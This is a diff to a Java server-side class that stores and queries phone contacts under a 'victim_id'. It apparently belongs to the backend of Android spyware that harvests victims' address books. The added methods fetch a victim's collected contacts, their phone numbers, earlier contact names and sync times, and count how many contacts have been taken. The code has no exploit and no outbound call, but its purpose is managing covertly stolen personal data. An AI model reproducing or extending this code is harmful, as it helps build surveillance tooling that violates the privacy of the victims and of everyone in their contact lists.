@@ -21,10 +21,15 @@ public class Contacts extends BaseTable<Contact> {
 
     private static final String COLUMN_PHONE_NUMBER = "phone_number";
     private static final String COLUMN_PHONE_TYPE = "phone_type";
-    private static final String COLUMN_VICTIM_ID = "victim_id";
+    public static final String COLUMN_VICTIM_ID = "victim_id";
     private static final String KEY_PHONE_NUMBERS = "phone_numbers";
     private static final String COLUMN_ANDROID_CONTACT_ID = "android_contact_id";
     private static final String TABLE_NAME_CONTACTS = "contacts";
+    private static final String COLUMN_AS_PRE_NAMES = "pre_names";
+    private static final String COLUMN_AS_PHONE_NUMBERS = "phone_numbers";
+    private static final String COLUMN_AS_PHONE_TYPES = "phone_types";
+    private static final String COLUMN_AS_TOTAL_CONTACTS = "total_contacts";
+    private static final String COLUMN_AS_SYNCED_AT = "synced_at";
 
     private static Contacts instance = new Contacts();
 
@@ -84,7 +89,7 @@ public class Contacts extends BaseTable<Contact> {
                 phoneNumbers = parsePhoneNumbers(null, jaPhoneNumbers);
             }
 
-            contactList.add(new Contact(victimId, androidContactId, null, name, phoneNumbers));
+            contactList.add(new Contact(victimId, androidContactId, null, name, phoneNumbers, null, 0));
 
         }
 
@@ -104,8 +109,13 @@ public class Contacts extends BaseTable<Contact> {
 
                 for (int i = 0; i < jaPhoneNumbers.length(); i++) {
                     final JSONObject jaPhoneNumber = jaPhoneNumbers.getJSONObject(i);
-                    final String phoneNumber = jaPhoneNumber.getString(COLUMN_PHONE_NUMBER);
-                    final String phoneType = jaPhoneNumber.getString(COLUMN_PHONE_TYPE);
+                    String phoneNumber = jaPhoneNumber.getString(COLUMN_PHONE_NUMBER);
+                    String phoneType = jaPhoneNumber.getString(COLUMN_PHONE_TYPE);
+
+                    if (phoneNumber != null) {
+                        phoneNumber = phoneNumber.trim();
+                    }
+
                     phoneNumbers.add(new Contact.PhoneNumber(contactId, phoneNumber, phoneType));
                 }
 
@@ -135,7 +145,7 @@ public class Contacts extends BaseTable<Contact> {
             if (rs.first()) {
                 final String id = rs.getString(COLUMN_ID);
                 final String name = rs.getString(COLUMN_NAME);
-                contact = new Contact(null, null, id, name, null);
+                contact = new Contact(null, null, id, name, null, null, 0);
             }
 
             rs.close();
@@ -268,5 +278,85 @@ public class Contacts extends BaseTable<Contact> {
     @Override
     public boolean update(String whereColumn, String whereColumnValue, String updateColumn, String newUpdateColumnValue) {
         return update(TABLE_NAME_CONTACTS, whereColumn, whereColumnValue, updateColumn, newUpdateColumnValue);
+    }
+
+    public List<Contact> getAll(String victimId) {
+        List<Contact> contacts = null;
+        final String query = "SELECT c.name, GROUP_CONCAT(cna.name) AS pre_names, GROUP_CONCAT(p.phone) AS phone_numbers, GROUP_CONCAT(p.phone_type) AS phone_types,UNIX_TIMESTAMP(c.created_at) AS unix_epoch FROM contacts c INNER JOIN phone_numbers p ON p.contact_id = c.id LEFT JOIN contact_names_audit cna ON cna.contact_id = c.id WHERE c.victim_id= ? GROUP BY c.id ORDER BY c.id DESC;";
+        final java.sql.Connection con = Connection.getConnection();
+        try {
+            final PreparedStatement ps = con.prepareStatement(query);
+            ps.setString(1, victimId);
+            final ResultSet rs = ps.executeQuery();
+            if (rs.first()) {
+                contacts = new ArrayList<>();
+                do {
+                    final String name = rs.getString(COLUMN_NAME);
+                    final String preNames = rs.getString(COLUMN_AS_PRE_NAMES);
+                    final long syncedAt = rs.getLong(COLUMN_AS_UNIX_EPOCH);
+
+                    final String[] phoneNumbers = getGroupDecatenated(rs.getString(COLUMN_AS_PHONE_NUMBERS));
+                    final String[] phoneTypes = getGroupDecatenated(rs.getString(COLUMN_AS_PHONE_TYPES));
+
+                    List<Contact.PhoneNumber> phoneNumbersList = null;
+                    if (phoneNumbers != null) {
+                        phoneNumbersList = new ArrayList<>(phoneNumbers.length);
+                        for (int i = 0; i < phoneNumbers.length; i++) {
+                            phoneNumbersList.add(new Contact.PhoneNumber(null, phoneNumbers[i], phoneTypes[i]));
+                        }
+                    }
+
+                    contacts.add(new Contact(null, null, null, name, phoneNumbersList, preNames, syncedAt));
+
+                } while (rs.next());
+            }
+            rs.close();
+            ps.close();
+        } catch (SQLException e) {
+            e.printStackTrace();
+            try {
+                con.close();
+            } catch (SQLException e1) {
+                e1.printStackTrace();
+            }
+        }
+        return contacts;
+    }
+
+    private static String[] getGroupDecatenated(String data) {
+        if (data != null) {
+            return data.split(",");
+        }
+        return null;
+    }
+
+    public String getTotalContacts(String theVictimId) {
+        String totalContacts = null;
+        final String query = "SELECT COUNT(c.id) AS total_contacts FROM contacts c WHERE victim_id = ?";
+        final java.sql.Connection con = Connection.getConnection();
+        try {
+            final PreparedStatement ps = con.prepareStatement(query);
+
+            ps.setString(1, theVictimId);
+
+            final ResultSet rs = ps.executeQuery();
+
+            if (rs.first()) {
+                totalContacts = rs.getString(COLUMN_AS_TOTAL_CONTACTS);
+            }
+
+            rs.close();
+            ps.close();
+
+        } catch (SQLException e) {
+            e.printStackTrace();
+        } finally {
+            try {
+                con.close();
+            } catch (SQLException e) {
+                e.printStackTrace();
+            }
+        }
+        return totalContacts;
     }
 }
